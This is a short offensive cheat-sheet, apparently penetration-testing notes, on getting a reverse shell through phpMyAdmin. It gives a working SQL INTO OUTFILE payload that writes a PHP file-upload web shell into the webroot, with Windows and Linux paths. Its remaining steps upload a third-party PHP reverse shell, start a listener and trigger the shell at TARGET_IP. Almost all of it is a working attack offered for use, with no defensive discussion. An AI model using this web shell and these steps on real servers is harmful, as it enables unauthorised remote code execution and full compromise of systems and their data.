# PHPmyadmin Reverse Shell

## Requirements: Access to the administrative console

## Steps:

### 1) Go to SQL Tab, insert this code snippet:

Uploader file to accept our shells

    SELECT 
    "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
    INTO OUTFILE 'C:/wamp/www/uploader.php';

TIP: Webroot can be different. This example is for Windows machines. Linux is different, for example:

    /var/www/html/uploader.php

### 2) Browse to the uploader file

    http://TARGET_IP/uploader.php

### 3) Upload your reverse shell

Windows: Ivan Sincek PHP Shell
Linux: PentestMonkey PHP Shell

### 4) Setup listener and call your shell to catch it

    http://TARGET_IP/pwned.php
